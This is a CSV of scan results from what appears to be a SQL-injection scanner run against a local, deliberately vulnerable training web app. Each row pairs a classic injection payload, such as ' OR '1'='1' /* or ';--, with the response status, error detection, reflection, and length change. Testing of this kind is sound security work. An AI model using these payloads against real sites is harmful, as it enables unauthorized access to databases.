score,count,tested_url,param_or_field,payload,status_code,error_found,reflected,rel_length_change
78,1,http://localhost:8080/vulnerabilities/sqli/,id,' OR '1'='1' /*,200,True,False,0.9638312123241795
78,1,http://localhost:8080/vulnerabilities/sqli/,ALL_FIELDS,' OR '1'='1' /*,200,True,False,0.9638312123241795
78,1,http://localhost:8080/vulnerabilities/sqli/,id,';--,200,True,False,0.9638312123241795
78,1,http://localhost:8080/vulnerabilities/sqli/,ALL_FIELDS,';--,200,True,False,0.9638312123241795
78,1,http://localhost:8080/vulnerabilities/brute/,username,' OR '1'='1' /*,200,True,False,0.9515428571428571
78,1,http://localhost:8080/vulnerabilities/brute/,ALL_FIELDS,' OR '1'='1' /*,200,True,False,0.9515428571428571
78,1,http://localhost:8080/vulnerabilities/brute/,username,';--,200,True,False,0.9515428571428571
78,1,http://localhost:8080/vulnerabilities/brute/,ALL_FIELDS,';--,200,True,False,0.9515428571428571
30,4,http://localhost:8080/instructions.php?doc=%27+OR+%271%27%3D%271,doc,' OR '1'='1,200,False,False,5.9825610363726955
30,4,http://localhost:8080/instructions.php?doc=%22+OR+%221%22%3D%221,doc,""" OR ""1""=""1",200,False,False,5.9825610363726955
30,4,http://localhost:8080/instructions.php?doc=%27+OR+1%3D1+--+,doc,' OR 1=1 -- ,200,False,False,5.9825610363726955
30,4,http://localhost:8080/instructions.php?doc=%27+OR+%271%27%3D%271%27+--+,doc,' OR '1'='1' -- ,200,False,False,5.9825610363726955
30,4,http://localhost:8080/instructions.php?doc=%27+OR+%271%27%3D%271%27+%2F%2A,doc,' OR '1'='1' /*,200,False,False,5.9825610363726955
30,4,http://localhost:8080/instructions.php?doc=%22+OR+%22%22+%3D+%22,doc,""" OR """" = """,200,False,False,5.9825610363726955
30,4,http://localhost:8080/instructions.php?doc=%27%3B--,doc,';--,200,False,False,5.9825610363726955
30,4,http://localhost:8080/instructions.php?doc=%27+OR+%27a%27%3D%27a,doc,' OR 'a'='a,200,False,False,5.9825610363726955
22,1,http://localhost:8080/vulnerabilities/sqli/,id,' OR '1'='1,200,False,True,0.07635632953784327
22,1,http://localhost:8080/vulnerabilities/sqli/,ALL_FIELDS,' OR '1'='1,200,False,True,0.07635632953784327
22,1,http://localhost:8080/vulnerabilities/sqli/,id,' OR 1=1 -- ,200,False,True,0.07747265014512168
22,1,http://localhost:8080/vulnerabilities/sqli/,ALL_FIELDS,' OR 1=1 -- ,200,False,True,0.07747265014512168
22,1,http://localhost:8080/vulnerabilities/sqli/,id,' OR '1'='1' -- ,200,False,True,0.08193793257423532
22,1,http://localhost:8080/vulnerabilities/sqli/,ALL_FIELDS,' OR '1'='1' -- ,200,False,True,0.08193793257423532
22,1,http://localhost:8080/vulnerabilities/sqli/,id,' OR 'a'='a,200,False,True,0.07635632953784327
22,1,http://localhost:8080/vulnerabilities/sqli/,ALL_FIELDS,' OR 'a'='a,200,False,True,0.07635632953784327
